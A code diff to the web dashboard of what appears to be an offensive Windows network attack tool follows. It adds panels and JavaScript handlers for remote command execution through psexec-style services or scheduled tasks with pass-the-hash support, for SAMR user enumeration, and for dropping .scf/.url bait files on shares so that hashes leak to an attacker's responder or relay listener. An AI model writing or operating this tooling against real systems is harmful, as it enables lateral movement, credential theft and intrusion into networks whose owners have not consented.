@@ -1281,6 +1281,60 @@
       </div>
     </div>
 
+    <div class="filter-group">
+      <h2 class="section-title">post-auth exec</h2>
+      <div class="live-panel">
+        <input type="text" id="pa-target" placeholder="target host">
+        <div style="display:flex; gap:4px;">
+          <input type="text" id="pa-user" placeholder="user" style="flex:1;">
+          <input type="text" id="pa-domain" placeholder="domain" style="flex:1;">
+        </div>
+        <input type="password" id="pa-pass" placeholder="password">
+        <input type="text" id="pa-nthash" placeholder="nthash (hex or LM:NT — pass-the-hash)">
+        <input type="text" id="pa-command" placeholder="command">
+        <select id="pa-method" style="width:100%;">
+          <option value="scmr">scmr (psexec-class service)</option>
+          <option value="at">atexec (scheduled task)</option>
+        </select>
+        <div style="display:flex; gap:4px;">
+          <button class="btn" id="btn-pa-exec" style="flex:1;">➤ exec</button>
+        </div>
+        <div class="live-save-info" id="pa-info"></div>
+        <div class="live-err" id="pa-err"></div>
+      </div>
+    </div>
+
+    <div class="filter-group">
+      <h2 class="section-title">samr dump</h2>
+      <div class="live-panel">
+        <div style="display:flex; gap:4px;">
+          <button class="btn" id="btn-samr" style="flex:1;">dump local users</button>
+        </div>
+        <div class="live-save-info" id="samr-info"></div>
+        <div class="live-err" id="samr-err"></div>
+      </div>
+    </div>
+
+    <div class="filter-group">
+      <h2 class="section-title">bait drop</h2>
+      <div class="live-panel">
+        <input type="text" id="bd-listener" placeholder="listener (your responder/relay IP)">
+        <input type="text" id="bd-share" placeholder="share (default IPC$ — try writable shares)">
+        <div style="display:flex; gap:4px;">
+          <input type="text" id="bd-fname" placeholder="fname" style="flex:1;" value="settings">
+          <select id="bd-kind" style="flex:1;">
+            <option value="scf">.scf</option>
+            <option value="url">.url</option>
+          </select>
+        </div>
+        <div style="display:flex; gap:4px;">
+          <button class="btn" id="btn-bd-drop" style="flex:1;">◈ drop</button>
+        </div>
+        <div class="live-save-info" id="bd-info"></div>
+        <div class="live-err" id="bd-err"></div>
+      </div>
+    </div>
+
     <div class="filter-group" id="live-group">
       <h2 class="section-title">live capture</h2>
       <div class="live-panel">
@@ -3678,7 +3732,120 @@ document.getElementById('btn-resp-stop').addEventListener('click', respStop);
 document.getElementById('btn-relay-start').addEventListener('click', relayStart);
 document.getElementById('btn-relay-stop').addEventListener('click', relayStop);
 document.getElementById('btn-co-fire').addEventListener('click', coerceFire);
+
+async function paExec() {
+  const info = document.getElementById('pa-info');
+  const err = document.getElementById('pa-err');
+  const target = document.getElementById('pa-target').value.trim();
+  const user = document.getElementById('pa-user').value.trim();
+  const domain = document.getElementById('pa-domain').value.trim();
+  const password = document.getElementById('pa-pass').value;
+  const nthash = document.getElementById('pa-nthash').value.trim();
+  const command = document.getElementById('pa-command').value.trim();
+  const method = document.getElementById('pa-method').value;
+  err.textContent = '';
+  if (!target || !user || !command) {
+    info.textContent = '';
+    err.textContent = 'target, user and command are required';
+    return;
+  }
+  if (!password && !nthash) {
+    err.textContent = 'password or nthash required';
+    return;
+  }
+  info.textContent = `executing via ${method} on ${target}…`;
+  try {
+    const res = await fetch(method === 'scmr' ? '/api/exec/scmr' : '/api/exec/at', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ target, command, user, domain, password: password || undefined, nthash: nthash || undefined })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      info.textContent = `✔ ${method} executed on ${target}${data.service ? ' (service ' + data.service + ')' : ''}`;
+    } else {
+      info.textContent = '';
+      err.textContent = data.error || 'exec failed';
+    }
+  } catch (e) { err.textContent = 'network error: ' + e.message; }
+}
+
+async function samrDump() {
+  const info = document.getElementById('samr-info');
+  const err = document.getElementById('samr-err');
+  const target = document.getElementById('pa-target').value.trim();
+  const user = document.getElementById('pa-user').value.trim();
+  const domain = document.getElementById('pa-domain').value.trim();
+  const password = document.getElementById('pa-pass').value;
+  const nthash = document.getElementById('pa-nthash').value.trim();
+  err.textContent = '';
+  if (!target || !user) {
+    info.textContent = '';
+    err.textContent = 'target and user are required (set in post-auth exec above)';
+    return;
+  }
+  if (!password && !nthash) {
+    err.textContent = 'password or nthash required';
+    return;
+  }
+  info.textContent = `enumerating ${target}…`;
+  try {
+    const res = await fetch('/api/samr/dump', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ target, user, domain, password: password || undefined, nthash: nthash || undefined })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      const users = (data.users || []).filter((v, i, a) => a.indexOf(v) === i).join(', ');
+      info.textContent = `✔ domains: ${(data.domains || []).join(', ')} — users: ${users || '(none)'}`;
+    } else {
+      info.textContent = '';
+      err.textContent = data.error || 'dump failed';
+    }
+  } catch (e) { err.textContent = 'network error: ' + e.message; }
+}
+
+async function baitDrop() {
+  const info = document.getElementById('bd-info');
+  const err = document.getElementById('bd-err');
+  const target = document.getElementById('pa-target').value.trim();
+  const user = document.getElementById('pa-user').value.trim();
+  const domain = document.getElementById('pa-domain').value.trim();
+  const password = document.getElementById('pa-pass').value;
+  const nthash = document.getElementById('pa-nthash').value.trim();
+  const listener = document.getElementById('bd-listener').value.trim();
+  const share = document.getElementById('bd-share').value.trim();
+  const fname = document.getElementById('bd-fname').value.trim() || 'settings';
+  const kind = document.getElementById('bd-kind').value;
+  err.textContent = '';
+  if (!target || !user || !listener) {
+    info.textContent = '';
+    err.textContent = 'target, user and listener are required (target/user in post-auth exec above)';
+    return;
+  }
+  if (!password && !nthash) {
+    err.textContent = 'password or nthash required';
+    return;
+  }
+  info.textContent = `dropping ${fname}.${kind} on ${target}${share ? '/' + share : ''}…`;
+  try {
+    const res = await fetch('/api/bait/drop', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ target, listener, user, domain, password: password || undefined, nthash: nthash || undefined, share: share || undefined, fname, kind })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      info.textContent = `✔ ${data.file} dropped on ${data.share} — watch responder/relay at ${listener}`;
+    } else {
+      info.textContent = '';
+      err.textContent = data.error || 'drop failed';
+    }
+  } catch (e) { err.textContent = 'network error: ' + e.message; }
+}
+
 relayPoll();   // reflect relay state if it's already running
+document.getElementById('btn-pa-exec').addEventListener('click', paExec);
+document.getElementById('btn-samr').addEventListener('click', samrDump);
+document.getElementById('btn-bd-drop').addEventListener('click', baitDrop);
 document.getElementById('btn-alert-webhook').addEventListener('click', saveAlertWebhook);
 document.getElementById('alert-webhook').addEventListener('keydown', e => {
   if (e.key === 'Enter') saveAlertWebhook();
